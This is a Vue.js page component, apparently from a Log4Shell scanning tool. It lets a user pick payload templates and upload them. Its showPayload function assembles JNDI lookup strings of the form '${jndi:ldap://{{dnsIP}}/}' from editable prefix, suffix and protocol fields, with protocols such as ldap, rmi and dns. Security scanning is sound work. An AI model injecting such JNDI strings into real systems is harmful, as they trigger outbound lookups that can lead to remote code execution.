<template>
  <div class="createPost-container" style="text-align: center">
    <div class="createPost-main-container">
      <h2 style="text-align: center;">Payloads原型选定</h2>
      <el-transfer
        v-model="value"
        style="text-align: left; display: inline-block"
        filterable
        :left-default-checked="[]"
        :right-default-checked="[]"
        :render-content="renderFunc"
        :titles="['Payloads List', 'Payloads upload List']"
        :format="{
          noChecked: '0/${total}',
          hasChecked: '${checked}/${total}'
        }"
        :data="data"
        @change="handleChange"
      >
        <div slot="left-footer" class="transfer-footer" align="center">
          <el-button class="filter-item" type="primary" style="width: 300px" @click="showDialog()">ADD</el-button>
        </div>
        <div slot="right-footer" class="transfer-footer" align="center">
          <el-button class="filter-item" type="primary" style="width: 300px" @click="upload()">upload</el-button>
        </div>
      </el-transfer>

      <el-dialog :visible.sync="dialogFormVisible">
        <el-form ref="payloadForm" :model="temp" label-position="left" label-width="150px" style="width: 600px; margin-left:50px;">
          <el-form-item label="JNDI_PRE" prop="JNDI_PRE">
            <el-input v-model="temp.jndi_pre" />
          </el-form-item>
          <el-form-item label="JNDI_SUF" prop="JNDI_SUF">
            <el-input v-model="temp.jndi_suf" />
          </el-form-item>
          <el-form-item label="PROTOCOL_PRE" prop="PROTOCOL_PRE">
            <el-input v-model="temp.protocol_pre" />
          </el-form-item>
          <el-form-item label="PROTOCOL" prop="PROTOCOL">
            <el-input v-model="temp.protocol" placeholder="ldap, rmi, dns, iiop, ldaps, nis, corba, http, nds, drop" />
          </el-form-item>
          <!--el-form-item label="PROTOCOL">
            <el-select v-model="temp.protocol" placeholder="Please pick a protocol" style="width: 100%">
              <el-option v-for="item in protocols" :key="item" :label="item" :value="item" />
            </el-select>
          </el-form-item-->
          <el-form-item label="PROTOCOL_SUF" prop="PROTOCOL_SUF">
            <el-input v-model="temp.protocol_suf" />
          </el-form-item>
        </el-form>
        <div slot="footer" class="dialog-footer">
          <el-button type="primary" @click="showPayload()">
            Show
          </el-button>
          <!--el-button type="primary" @click="addPayloads()">
            Confirm
          </el-button-->
          <el-button @click="dialogFormVisible = false">
            Cancel
          </el-button>
        </div>
      </el-dialog>
    </div>
  </div>
</template>

<style>
.transfer-footer {
  margin-left: 20px;
  padding: 6px 5px;
}
</style>

<script>
import { uploadPayloads, origPayloads, payloads_detail } from '@/api/config'

export default {
  data() {
    const generateData = _ => {
      const data = []
      const payloads = origPayloads
      for (let i = 0; i < payloads.length; i++) {
        data.push({
          key: i + 1,
          label: payloads[i],
          disabled: false
        })
      }
      return data
    }
    const payloadData = _ => {
      const data = []
      const payloads = payloads_detail
      for (let i = 0; i < payloads.length; i++) {
        data[i + 1] = payloads[i]
      }
      return data
    }
    return {
      details: payloadData(),
      temp: {
        jndi_pre: '',
        jndi_suf: '',
        protocol: '',
        protocol_pre: '',
        protocol_suf: ''
      },
      dialogFormVisible: false,
      data: generateData(),
      value: [],
      renderFunc(h, option) {
        return <span>{ option.label }</span>
      },
      payload: ''
      // protocols: ['ldap', 'rmi', 'dns', 'iiop', 'ldaps', 'nis', 'corba', 'http', 'nds', 'drop']
    }
  },
  beforeDestroy() {
    sessionStorage.setItem('payloads_data', JSON.stringify(this.$data))
  },
  created() {
    const data = JSON.parse(sessionStorage.getItem('payloads_data'))
    if (data !== null) {
      Object.assign(this, data)
    }
    this.temp = {
      jndi_pre: '',
      jndi_suf: '',
      protocol: '',
      protocol_pre: '',
      protocol_suf: ''
    }
  },

  methods: {
    handleChange(value, direction, movedKeys) {
      // console.log(value, direction, movedKeys)
    },
    upload() {
      const list = []
      const detial_list = []
      for (let i = 0; i < this.value.length; i++) {
        list.push(this.data[this.value[i] - 1].label)
        detial_list.push(this.details[this.value[i]])
      }
      uploadPayloads({ 'payloads': list, 'details': detial_list }).then(response => {
        if (response.code === 20000) {
          this.$notify({
            title: 'Success',
            message: 'Upload Successfully',
            type: 'success',
            duration: 2000
          })
        } else {
          this.$notify({
            title: 'Fail',
            message: 'Upload Fail',
            type: 'fail',
            duration: 2000
          })
        }
      })
    },
    showDialog() {
      this.dialogFormVisible = true
    },
    addPayloads(payload) {
      this.data.push({
        key: this.data.length + 1,
        label: payload,
        disabled: false
      })
      this.details[this.data.length ] = this.temp
      this.temp = {
        jndi_pre: '',
        jndi_suf: '',
        protocol: '',
        protocol_pre: '',
        protocol_suf: ''
      }
    },
    showPayload() {
      const message = '${' + this.temp.jndi_pre + 'jndi' + this.temp.jndi_suf +
        ':' + this.temp.protocol_pre + this.temp.protocol + this.temp.protocol_suf +
        '://{{dnsIP}}/}'

      this.$alert(message, 'Payload',
        {
          confirmButtonText: 'Comfirm Add',
          callback: () => {
            this.addPayloads(message)
            this.dialogFormVisible = false
          }
        }
      )
    }
  }
}
</script>

<style lang="scss" scoped>
@import "~@/styles/mixin.scss";

.createPost-container {
  position: relative;

  .createPost-main-container {
    padding: 10px 45px 20px 50px;

    .postInfo-container {
      position: relative;
      @include clearfix;
      margin-bottom: 10px;

      .postInfo-container-item {
        float: left;
      }
    }
  }

  .word-counter {
    width: 40px;
    position: absolute;
    right: 10px;
    top: 0px;
  }
}

::v-deep .el-transfer-panel{
  width: 500px;
  height: 650px;
}
::v-deep .el-transfer-panel__list.is-filterable{
  height: 500px;
}
::v-deep .el-transfer__buttons{
  display: flow;
  align-items: center;
  justify-content: center;
  .el-button.el-button--primary{
    margin-left: 5px;
  }
}

::v-deep .el-transfer-panel__footer{
  height: 50px;
}
</style>
